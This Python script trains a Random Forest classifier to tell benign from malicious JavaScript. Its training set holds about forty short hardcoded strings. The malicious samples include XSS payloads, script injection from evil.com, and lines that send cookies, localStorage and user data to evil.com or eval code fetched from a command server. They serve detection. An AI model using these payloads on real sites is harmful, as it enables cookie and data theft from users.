"""
JavaScript ML Model Training Script
Trains a machine learning model for JavaScript malware detection

Usage:
    python ml_js_model/training/train_js_model.py

This script:
1. Loads sample JavaScript code (benign + malicious)
2. Extracts features from code
3. Trains an ML model (Random Forest)
4. Saves trained model for use in js_model_predict.py
"""

import os
import pickle
import logging
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, accuracy_score
import numpy as np

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Model output paths
CURRENT_DIR = os.path.dirname(__file__)
TRAINING_DIR = os.path.dirname(CURRENT_DIR)
MODEL_OUTPUT_DIR = TRAINING_DIR  # Same as ml_js_model/
MODEL_PATH = os.path.join(MODEL_OUTPUT_DIR, 'js_model.pkl')
VECTORIZER_PATH = os.path.join(MODEL_OUTPUT_DIR, 'js_vectorizer.pkl')


def load_training_data() -> tuple:
    """
    Load or create sample training data for JavaScript detection
    
    Returns:
        tuple: (code_samples, labels) where labels are 0 (benign) or 1 (malicious)
    """
    
    # Sample benign JavaScript
    benign_js = [
        'console.log("Hello World");',
        'function greet(name) { return "Hello " + name; }',
        'var x = 10; var y = 20; console.log(x + y);',
        'const arr = [1, 2, 3, 4, 5]; arr.forEach(item => console.log(item));',
        'function calculateSum(numbers) { return numbers.reduce((a, b) => a + b, 0); }',
        'const obj = { name: "John", age: 30 }; console.log(obj.name);',
        'if (true) { console.log("condition met"); }',
        'for (let i = 0; i < 10; i++) { console.log(i); }',
        'class Animal { constructor(name) { this.name = name; } }',
        'const promise = new Promise((resolve, reject) => { resolve("done"); });',
        'async function fetchData() { const data = await fetch("/api/data"); }',
        'document.getElementById("btn").addEventListener("click", function() { alert("Clicked"); });',
        'const timer = setInterval(() => { console.log("tick"); }, 1000);',
        'Array.prototype.sum = function() { return this.reduce((a, b) => a + b); };',
        'function recursiveSum(n) { return n <= 0 ? 0 : n + recursiveSum(n - 1); }',
    ]
    
    # Sample malicious JavaScript
    malicious_js = [
        'eval("console.log(\\"pwned\\")");',
        'eval(atob("ZXZhbCgiZW52aWwgY29kZSIp"));',
        'var x = "eval"; window[x]("malicious code");',
        'Function("alert(\'XSS\')")();',
        'document.write("<script src=\'http://evil.com/malware.js\'></script>");',
        'var script = document.createElement("script"); script.src = "http://evil.com/steal.js"; document.appendChild(script);',
        'innerHTML = "<img src=x onerror=alert(\'XSS\')>";',
        'XMLHttpRequest.open("POST", "http://evil.com/steal", true); request.send(localStorage);',
        'fetch("http://evil.com/api").then(r => r.text()).then(d => eval(d));',
        'String.fromCharCode(101, 118, 97, 108, 40, 34, 99, 111, 100, 101, 34, 41, 59);',
        'new WebWorker("http://evil.com/miner.js");',
        'setInterval(() => { fetch("http://evil.com/c2").then(r => r.json()).then(d => eval(d)); }, 5000);',
        'atob("Zm9yKHZhciBpPTA7aSAxMDtpKyspIGV2YWwoY29kZSk=");',
        'document.location = "http://evil.com/?cookie=" + document.cookie;',
        'var img = new Image(); img.src = "http://evil.com/log?data=" + JSON.stringify(userData);',
        'Object.defineProperty(window, "location", { value: "http://evil.com" });',
        'setInterval(function() { new WebWorker("crypto_miner.js"); }, 1000);',
        'var code = String.fromCharCode(...data); eval(code);',
        'document.body.innerHTML += "<form><input name=password></form>";',
        'window.onload = function() { eval(atob(localStorage.payload)); };',
    ]
    
    code_samples = benign_js + malicious_js
    labels = [0] * len(benign_js) + [1] * len(malicious_js)
    
    return code_samples, labels


def train_model():
    """Train JavaScript classification model"""
    
    logger.info("=" * 70)
    logger.info("🚀 JavaScript ML Model Training")
    logger.info("=" * 70)
    
    # Ensure output directory exists
    os.makedirs(MODEL_OUTPUT_DIR, exist_ok=True)
    
    # Load training data
    logger.info("\n📥 Loading training data...")
    code_samples, labels = load_training_data()
    logger.info(f"   Loaded {len(code_samples)} code samples")
    logger.info(f"   Benign: {labels.count(0)} | Malicious: {labels.count(1)}")
    
    # Create feature matrix using TF-IDF vectorization on code tokens
    logger.info("\n⚙️ Extracting features...")
    vectorizer = TfidfVectorizer(
        analyzer='char',
        ngram_range=(2, 4),
        max_features=200,
        lowercase=False  # Preserve case for code analysis
    )
    X = vectorizer.fit_transform(code_samples)
    y = np.array(labels)
    
    logger.info(f"   Feature matrix shape: {X.shape}")
    logger.info(f"   Top features: {vectorizer.get_feature_names_out()[:5]}...")
    
    # Split into train/test
    logger.info("\n📊 Splitting data...")
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, random_state=42, stratify=y
    )
    logger.info(f"   Train set: {X_train.shape[0]} samples")
    logger.info(f"   Test set: {X_test.shape[0]} samples")
    
    # Train Random Forest model
    logger.info("\n🤖 Training Random Forest model...")
    model = RandomForestClassifier(
        n_estimators=100,
        max_depth=25,
        min_samples_split=3,
        min_samples_leaf=1,
        random_state=42,
        n_jobs=-1
    )
    model.fit(X_train, y_train)
    
    # Evaluate
    logger.info("\n📈 Model Evaluation")
    y_pred_train = model.predict(X_train)
    y_pred_test = model.predict(X_test)
    
    train_acc = accuracy_score(y_train, y_pred_train)
    test_acc = accuracy_score(y_test, y_pred_test)
    
    logger.info(f"   Training Accuracy: {train_acc:.4f}")
    logger.info(f"   Test Accuracy: {test_acc:.4f}")
    
    logger.info("\n📋 Classification Report (Test Set):")
    logger.info("\n" + classification_report(y_test, y_pred_test,
                                             target_names=['Benign', 'Malicious']))
    
    # Feature importance
    logger.info("\n🔍 Top Malicious Code Patterns (Feature Importance):")
    feature_names = vectorizer.get_feature_names_out()
    importances = model.feature_importances_
    top_indices = np.argsort(importances)[-10:][::-1]
    
    for idx in top_indices:
        logger.info(f"   '{feature_names[idx]}': {importances[idx]:.4f}")
    
    # Save model
    logger.info("\n💾 Saving model...")
    with open(MODEL_PATH, 'wb') as f:
        pickle.dump(model, f)
    logger.info(f"   ✅ Model saved: {MODEL_PATH}")
    
    # Save vectorizer
    with open(VECTORIZER_PATH, 'wb') as f:
        pickle.dump(vectorizer, f)
    logger.info(f"   ✅ Vectorizer saved: {VECTORIZER_PATH}")
    
    # Test with sample JavaScript
    logger.info("\n🧪 Testing trained model...")
    test_codes = [
        'console.log("Hello World");',
        'eval(atob("ZXZhbCgiY29kZSIp"));',
    ]
    
    for code in test_codes:
        X_sample = vectorizer.transform([code])
        pred = model.predict(X_sample)[0]
        proba = model.predict_proba(X_sample)[0]
        
        threat_level = 'MALICIOUS' if pred == 1 else 'BENIGN'
        confidence = max(proba)
        
        logger.info(f"   {code[:50]}{'...' if len(code) > 50 else ''}")
        logger.info(f"     → {threat_level} (confidence: {confidence:.2f})")
    
    logger.info("\n" + "=" * 70)
    logger.info("✅ Model training complete!")
    logger.info("=" * 70)
    
    return model, vectorizer


def main():
    """Main training function"""
    try:
        model, vectorizer = train_model()
        logger.info("\n✅ JavaScript ML model is ready to use!")
        logger.info("   Import with: from js_model_predict import predict_js")
        
    except Exception as e:
        logger.error(f"❌ Training failed: {e}")
        raise


if __name__ == '__main__':
    main()
